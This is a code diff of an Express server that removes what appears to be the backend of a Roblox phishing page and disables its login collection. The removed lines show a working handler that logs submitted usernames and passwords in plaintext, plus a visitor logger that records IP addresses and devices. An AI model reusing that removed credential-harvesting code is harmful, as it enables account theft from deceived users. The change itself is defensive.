@@ -2,48 +2,25 @@ const express = require('express');
 const app = express();
 const path = require('path');
 
-// ВАЖНО: Говорим Express доверять прокси Render, чтобы видеть реальный IP посетителя
+app.disable('x-powered-by');
 app.set('trust proxy', true);
 
-// Позволяем серверу читать JSON из запросов
-app.use(express.json());
-
-// 🌐 ЛОГГЕР ПОСЕЩЕНИЙ (ДОЛЖЕН СТОЯТЬ ПЕРЕД РАЗДАЧЕЙ СТАТИКИ)
-app.use((req, res, next) => {
-    // Логируем только заходы на главную страницу, чтобы не спамить картинками
-    if (req.method === 'GET' && (req.path === '/' || req.path === '/index.html')) {
-        const ip = req.ip || req.connection.remoteAddress;
-        const userAgent = req.headers['user-agent'] || 'Неизвестное устройство';
-        const time = new Date().toLocaleString('ru-RU');
-        
-        console.log('\n====================================');
-        console.log(`🌐 НОВЫЙ ПОСЕТИТЕЛЬ ЗАШЕЛ НА САЙТ!`);
-        console.log(`📍 IP: ${ip}`);
-        console.log(`💻 Устройство: ${userAgent}`);
-        console.log(`⏰ Время: ${time}`);
-        console.log('====================================\n');
-    }
-    next();
+// Login collection is disabled. Request bodies are not parsed or logged.
+app.all('/login', (_req, res) => {
+    res.set('Cache-Control', 'no-store');
+    res.status(410).send('Демо-страница не выполняет вход. Используйте официальный Roblox: https://www.roblox.com/login');
 });
 
-// Раздаем статические файлы (HTML, CSS, JS, картинки)
+// Do not serve the old client script that submits account credentials.
+app.all('/script.js', (_req, res) => {
+    res.set('Cache-Control', 'no-store');
+    res.status(410).send('Отправка формы отключена.');
+});
+
+// Serve the original site files, including the original bg.jpg and style.css.
 app.use(express.static(__dirname));
 
-// Обработка отправки формы (ЛОГИНЫ И ПАРОЛИ)
-app.post('/login', (req, res) => {
-    const { username, password } = req.body;
-    
-    console.log('\n====================================');
-    console.log(`🔥 НОВЫЙ ЛОГИН!`);
-    console.log(`👤 Юзер: ${username}`);
-    console.log(`🔑 Пароль: ${password}`);
-    console.log(`⏰ Время: ${new Date().toLocaleString('ru-RU')}`);
-    console.log('====================================\n');
-
-    res.status(200).send('OK');
-});
-
-// Запуск сервера на порту, который дает Render
+// Start server on the port provided by Render.
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Сервер запущен на порту ${PORT}`);
